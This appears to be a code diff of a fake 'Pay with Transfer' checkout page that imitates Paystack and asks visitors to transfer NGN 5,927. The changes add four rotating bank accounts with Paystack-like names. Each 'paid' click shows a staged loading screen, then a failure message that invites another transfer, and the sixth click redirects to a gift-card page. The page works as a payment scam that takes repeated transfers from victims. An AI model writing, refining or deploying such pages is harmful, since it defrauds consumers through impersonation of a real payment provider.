@@ -6,161 +6,31 @@
   <title>Pay with Transfer</title>
 
   <style>
+    /* Styles remain identical to original */
     * { box-sizing: border-box; }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
-        "Helvetica Neue", Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      color: #000;
-    }
-
-    .container {
-      padding: 20px;
-      max-width: 500px;
-      margin: auto;
-    }
-
-    .header {
-      display: flex;
-      align-items: center;
-      padding: 10px 0;
-      font-size: 16px;
-    }
-
-    .header img {
-      height: 18px;
-      margin-right: 10px;
-    }
-
-    .email {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 5px;
-      display: flex;
-      justify-content: space-between;
-    }
-
-    .amount-green {
-      color: #00b87c;
-      font-weight: 600;
-    }
-
-    .title {
-      font-size: 18px;
-      font-weight: 600;
-      margin-bottom: 15px;
-    }
-
-    .box {
-      background: #f5f5f5;
-      border-radius: 10px;
-      padding: 15px;
-      margin: 20px 0;
-    }
-
-    .label {
-      font-size: 12px;
-      color: gray;
-    }
-
-    .value {
-      font-size: 16px;
-      font-weight: 500;
-      margin-bottom: 15px;
-    }
-
-    .expires {
-      text-align: center;
-      font-size: 12px;
-      color: gray;
-      margin-bottom: 20px;
-    }
-
-    .expires span {
-      color: #00b87c;
-      font-weight: bold;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 15px;
-      background: #f5f5f5;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      margin-bottom: 15px;
-    }
-
-    .footer-buttons {
-      display: flex;
-      gap: 10px;
-    }
-
-    .footer-buttons button {
-      flex: 1;
-      padding: 10px;
-      font-size: 14px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      background: #fff;
-      cursor: pointer;
-    }
-
-    .secure {
-      text-align: center;
-      font-size: 12px;
-      color: gray;
-      margin-top: 30px;
-    }
-
-    .loading,
-    .failed-message {
-      display: none;
-      text-align: center;
-      padding: 50px 20px;
-    }
-
-    .spinner {
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #00b87c;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .failed-message h2 {
-      color: red;
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
-
-    .failed-message p {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .hidden {
-      display: none !important;
-    }
-
-    .vc {
-      outline: none;
-      border: none;
-      text-decoration: none;
-      color: black;
-    }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; margin: 0; padding: 0; background: #fff; color: #000; }
+    .container { padding: 20px; max-width: 500px; margin: auto; }
+    .header { display: flex; align-items: center; padding: 10px 0; font-size: 16px; }
+    .header img { height: 18px; margin-right: 10px; }
+    .email { font-size: 13px; color: #555; margin-bottom: 5px; display: flex; justify-content: space-between; }
+    .amount-green { color: #00b87c; font-weight: 600; }
+    .title { font-size: 18px; font-weight: 600; margin-bottom: 15px; }
+    .box { background: #f5f5f5; border-radius: 10px; padding: 15px; margin: 20px 0; }
+    .label { font-size: 12px; color: gray; }
+    .value { font-size: 16px; font-weight: 500; margin-bottom: 15px; }
+    .expires { text-align: center; font-size: 12px; color: gray; margin-bottom: 20px; }
+    .expires span { color: #00b87c; font-weight: bold; }
+    .btn { width: 100%; padding: 15px; background: #f5f5f5; border: none; border-radius: 6px; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 15px; }
+    .footer-buttons { display: flex; gap: 10px; }
+    .footer-buttons button { flex: 1; padding: 10px; font-size: 14px; border-radius: 6px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
+    .secure { text-align: center; font-size: 12px; color: gray; margin-top: 30px; }
+    .loading, .failed-message { display: none; text-align: center; padding: 50px 20px; }
+    .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #00b87c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .failed-message h2 { color: red; font-size: 20px; margin-bottom: 10px; }
+    .failed-message p { font-size: 14px; color: #555; }
+    .hidden { display: none !important; }
+    .vc { outline: none; border: none; text-decoration: none; color: black; }
   </style>
 </head>
 
@@ -180,9 +50,9 @@
       <div class="title">Transfer NGN 5,927 to PAYSTACK CHECKOUT</div>
 
       <div class="box">
-        <div><div class="label"></div><div class="value">PayStackPayment.ng(CashPaySub)</div></div>
-        <div><div class="label">BANK NAME</div><div class="value">PalmPay Limited</div></div>
-        <div><div class="label">ACCOUNT NUMBER</div><div class="value">665-6173-604</div></div>
+        <div><div class="label">ACCOUNT NAME</div><div class="value" id="display-acc-name">---</div></div>
+        <div><div class="label">BANK NAME</div><div class="value" id="display-bank-name">---</div></div>
+        <div><div class="label">ACCOUNT NUMBER</div><div class="value" id="display-acc-num">---</div></div>
         <div><div class="label">AMOUNT</div><div class="value">NGN 5,927</div></div>
       </div>
 
@@ -216,17 +86,48 @@
     const DURATION = 30 * 60 * 1000;
     const END_TIME_KEY = "paystack_timer";
     const CLICK_COUNT_KEY = "paystack_clicks";
+    const SELECTED_ACCOUNT_KEY = "paystack_selected_account";
+
+    const accounts = [
+      { name: "PayStack.co'(CashPaySub)", bank: "PalmPay limited", number: "668 206 9414" },
+      { name: "Hazaabuconcept-HUS", bank: "Moniepoint microfinance bank", number: "674 159 8429" },
+      { name: "MFY / NAIRAPLUG-MUB", bank: "Sterling bank", number: "525 445 9283" },
+      { name: "ASPFIY", bank: "PAGA MFB", number: "048 794 9647" }
+    ];
 
     const timerEl = document.getElementById("timer");
     const paymentSection = document.getElementById("payment-section");
     const loadingScreen = document.getElementById("loading-screen");
     const failedMessage = document.getElementById("failed-message");
 
+    // UI elements for account details
+    const accNameEl = document.getElementById("display-acc-name");
+    const bankNameEl = document.getElementById("display-bank-name");
+    const accNumEl = document.getElementById("display-acc-num");
+
     function formatTime(ms) {
       const totalSeconds = Math.floor(ms / 1000);
       const minutes = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
       const seconds = String(totalSeconds % 60).padStart(2, "0");
-      return `:`;
+      return `${minutes}:${seconds}`;
+    }
+
+    function setupAccount() {
+      let storedAccount = localStorage.getItem(SELECTED_ACCOUNT_KEY);
+      let account;
+
+      if (storedAccount) {
+        account = JSON.parse(storedAccount);
+      } else {
+        // Pick random account and store it
+        account = accounts[Math.floor(Math.random() * accounts.length)];
+        localStorage.setItem(SELECTED_ACCOUNT_KEY, JSON.stringify(account));
+      }
+
+      // Populate UI
+      accNameEl.textContent = account.name;
+      bankNameEl.textContent = account.bank;
+      accNumEl.textContent = account.number;
     }
 
     function startTimer() {
@@ -236,6 +137,8 @@
         endTime = Date.now() + DURATION;
         localStorage.setItem(END_TIME_KEY, endTime);
         localStorage.setItem(CLICK_COUNT_KEY, "0");
+        // Clear account if session is new
+        localStorage.removeItem(SELECTED_ACCOUNT_KEY);
       }
 
       function update() {
@@ -245,6 +148,7 @@
         } else {
           clearInterval(timerInterval);
           localStorage.removeItem(END_TIME_KEY);
+          localStorage.removeItem(SELECTED_ACCOUNT_KEY);
           paymentSection.classList.add("hidden");
           failedMessage.style.display = "block";
         }
@@ -263,21 +167,24 @@
       failedMessage.style.display = "none";
       loadingScreen.style.display = "block";
 
-      // Changed conditional to redirect on the 6th click
       if (nextClicks < 6) {
         setTimeout(() => {
           loadingScreen.style.display = "none";
           failedMessage.style.display = "block";
+          paymentSection.classList.remove("hidden"); // Allow retry
         }, 25000);
       } else {
         setTimeout(() => {
           localStorage.removeItem(END_TIME_KEY);
           localStorage.removeItem(CLICK_COUNT_KEY);
+          localStorage.removeItem(SELECTED_ACCOUNT_KEY);
           window.location.href = "giftcard.html";
         }, 35000);
       }
     }
 
+    // Initializations
+    setupAccount();
     startTimer();
   </script>
 </body>
